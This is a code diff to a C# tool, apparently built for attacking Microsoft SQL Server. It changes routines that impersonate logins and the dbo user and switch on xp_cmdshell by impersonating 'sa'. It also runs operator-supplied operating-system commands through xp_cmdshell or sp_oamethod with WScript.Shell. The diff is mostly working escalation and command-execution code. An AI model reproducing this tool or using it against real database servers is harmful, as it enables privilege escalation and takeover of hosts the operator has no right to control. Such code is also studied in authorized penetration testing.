@@ -1,4 +1,4 @@
-using System;using System;
+using System;
 using System.Data.SqlClient;
 using System.Collections.Generic;
 
@@ -128,7 +128,7 @@ namespace SQL
         static List<string> ListImpersonableLogins(SqlConnection con)
         {
             List<string> logins = new List<string>();
-            string query = "SELECT name FROM sys.server_principals WHERE type IN ('S', 'U')" + "\n"; // Include 'sa'
+            string query = "SELECT name FROM sys.server_principals WHERE type IN ('S', 'U')";
             SqlCommand command = new SqlCommand(query, con);
 
             try
@@ -196,7 +196,6 @@ namespace SQL
 
         static bool CheckSysAdminAccess(SqlConnection con, string linkedServer)
         {
-            // Check if the current user has sysadmin access to the linked server
             string checkSysAdminQuery = $"SELECT IS_SRVROLEMEMBER('sysadmin', '{linkedServer}')";
 
             try
@@ -204,7 +203,6 @@ namespace SQL
                 SqlCommand command = new SqlCommand(checkSysAdminQuery, con);
                 object result = command.ExecuteScalar();
 
-                // Ensure that the result is a valid bit (0 or 1)
                 if (result != null && result is bool)
                 {
                     return (bool)result; // Cast directly to boolean
@@ -231,9 +229,6 @@ namespace SQL
                 impersonateCommand.ExecuteNonQuery();
                 Console.WriteLine($"\nImpersonating login: {impersonatedLogin}...\n");
 
-                // Ensure Ole Automation Procedures are enabled
-                EnableOleAutomationProcedures(con);
-
                 // Ask the user to choose between xp_cmdshell or sp_oamethod
                 Console.WriteLine("Choose how to execute the command:" + "\n");
                 Console.WriteLine("\t" + "1. Use xp_cmdshell");
@@ -241,14 +236,14 @@ namespace SQL
                 Console.Write("Enter 1 or 2: ");
                 string execChoice = Console.ReadLine();
 
-                // Get the command to execute
-                Console.Write("Enter the command to execute: ");
+                // Get the command to execute from the user
+                Console.Write("Enter the full command to execute: ");
                 string usercommand = Console.ReadLine();
 
                 if (execChoice == "1")
                 {
                     // Execute using xp_cmdshell
-                    Console.WriteLine();
+                    EnableXpCmdShell(con); // Ensure xp_cmdshell is enabled before running the command
                     ExecuteCommandWithXpCmdShell(con, usercommand);
                 }
                 else if (execChoice == "2")
@@ -275,26 +270,39 @@ namespace SQL
 
         static void ImpersonateAndExecute(SqlConnection con, string impersonatedUser)
         {
-            Console.Write("Enter the command to execute: ");
-            string usercommand = Console.ReadLine();
-
             try
             {
-                string impersonateCmd = $"EXECUTE AS USER = '{impersonatedUser}';";
-                SqlCommand impersonateCommand = new SqlCommand(impersonateCmd, con);
-                impersonateCommand.ExecuteNonQuery();
-                Console.WriteLine($"Impersonating user: {impersonatedUser}...\n");
+                // If the user is 'dbo', switch to msdb first
+                if (impersonatedUser.Equals("dbo", StringComparison.OrdinalIgnoreCase))
+                {
+                    string switchToMsdbCmd = "USE msdb; EXECUTE AS USER = 'dbo';";
+                    SqlCommand switchToMsdbCommand = new SqlCommand(switchToMsdbCmd, con);
+                    switchToMsdbCommand.ExecuteNonQuery();
+                    Console.WriteLine("\nSwitched to msdb and impersonating dbo user...\n");
+                }
+                else
+                {
+                    string impersonateCmd = $"EXECUTE AS USER = '{impersonatedUser}';";
+                    SqlCommand impersonateCommand = new SqlCommand(impersonateCmd, con);
+                    impersonateCommand.ExecuteNonQuery();
+                    Console.WriteLine($"\nImpersonating user: {impersonatedUser}...\n");
+                }
 
                 // Ask the user to choose between xp_cmdshell or sp_oamethod
                 Console.WriteLine("Choose how to execute the command:" + "\n");
-                Console.WriteLine("\t1. Use xp_cmdshell");
-                Console.WriteLine("\t2. Use sp_oamethod (WScript Shell)" + "\n");
+                Console.WriteLine("\t" + "1. Use xp_cmdshell");
+                Console.WriteLine("\t" + "2. Use sp_oamethod (WScript Shell)" + "\n");
                 Console.Write("Enter 1 or 2: ");
                 string execChoice = Console.ReadLine();
+
+                // Get the command to execute from the user
+                Console.Write("Enter the full command to execute: ");
+                string usercommand = Console.ReadLine();
 
                 if (execChoice == "1")
                 {
                     // Execute using xp_cmdshell
+                    EnableXpCmdShell(con); // Ensure xp_cmdshell is enabled before running the command
                     ExecuteCommandWithXpCmdShell(con, usercommand);
                 }
                 else if (execChoice == "2")
@@ -311,7 +319,7 @@ namespace SQL
                 string revertCmd = "REVERT;";
                 SqlCommand revertCommand = new SqlCommand(revertCmd, con);
                 revertCommand.ExecuteNonQuery();
-                Console.WriteLine("Reverted impersonation." + "\n");
+                Console.WriteLine("\n" + "Reverted impersonation." + "\n");
             }
             catch (Exception ex)
             {
@@ -319,33 +327,19 @@ namespace SQL
             }
         }
 
-        static void EnableOleAutomationProcedures(SqlConnection con)
+        static void EnableXpCmdShell(SqlConnection con)
         {
             try
             {
-                // Check if Ole Automation Procedures are enabled
-                string checkCmdShellQuery = "EXEC sp_configure 'Ole Automation Procedures';";
-                SqlCommand checkCmdShellCommand = new SqlCommand(checkCmdShellQuery, con);
-                SqlDataReader reader = checkCmdShellCommand.ExecuteReader();
-
-                while (reader.Read())
-                {
-                    int configValue = reader.GetInt32(1); // config_value is at index 1
-                    if (configValue == 0)
-                    {
-                        // Enable Ole Automation Procedures
-                        string enableCmdShellQuery = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
-                        SqlCommand enableCmdShellCommand = new SqlCommand(enableCmdShellQuery, con);
-                        enableCmdShellCommand.ExecuteNonQuery();
-                        Console.WriteLine("Enabled Ole Automation Procedures.\n");
-                    }
-                }
-
-                reader.Close();
+                // Enable xp_cmdshell if not already enabled
+                string enableCmd = "EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
+                SqlCommand enableCommand = new SqlCommand(enableCmd, con);
+                enableCommand.ExecuteNonQuery();
+                Console.WriteLine("Enabled xp_cmdshell.\n");
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Error enabling Ole Automation Procedures: " + ex.Message);
+                Console.WriteLine("Error enabling xp_cmdshell: " + ex.Message);
             }
         }
 
@@ -353,11 +347,12 @@ namespace SQL
         {
             try
             {
+                // Execute the full command provided by the user using xp_cmdshell
                 string execCmd = $"EXEC xp_cmdshell '{usercommand}';";
                 SqlCommand command = new SqlCommand(execCmd, con);
                 SqlDataReader reader = command.ExecuteReader();
 
-                bool hasOutput = false; // Flag to check if there is any output
+                bool hasOutput = false;
 
                 while (reader.Read())
                 {
@@ -383,11 +378,11 @@ namespace SQL
             }
         }
 
-
         static void ExecuteCommandWithSpOaMethod(SqlConnection con, string usercommand)
         {
             try
             {
+                // Execute the full command provided by the user using sp_oamethod
                 string execCmd = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{usercommand}';";
                 SqlCommand command = new SqlCommand(execCmd, con);
                 command.ExecuteNonQuery();
